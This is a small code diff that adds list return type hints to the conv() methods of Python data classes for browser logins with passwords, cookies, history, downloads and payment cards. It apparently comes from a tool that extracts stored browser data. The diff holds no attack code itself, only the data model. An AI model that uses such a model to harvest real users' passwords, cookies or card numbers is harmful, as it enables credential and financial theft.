@@ -14,7 +14,7 @@ class DataTypes:
             self.username = username
             self.password = password
 
-        def conv(self):
+        def conv(self) -> list:
             return [self.url, self.username, self.password]
 
     class Cookie:
@@ -26,7 +26,7 @@ class DataTypes:
             self.expires = bool(expires)
             self.expire_date = expires
 
-        def conv(self):
+        def conv(self) -> list:
             return [
                 self.host,
                 self.expires,
@@ -42,7 +42,7 @@ class DataTypes:
             self.title = title
             self.timestamp = timestamp
 
-        def conv(self):
+        def conv(self) -> list:
             return [self.url, self.title, self.timestamp]
 
     class Download:
@@ -50,7 +50,7 @@ class DataTypes:
             self.tab_url = tab_url
             self.target_path = target_path
 
-        def conv(self):
+        def conv(self) -> list:
             return [self.tab_url, self.target_path]
 
     class Card:
@@ -61,7 +61,7 @@ class DataTypes:
             self.number = number
             self.date_modified = date_modified
 
-        def conv(self):
+        def conv(self) -> list:
             return [
                 self.name,
                 self.month,
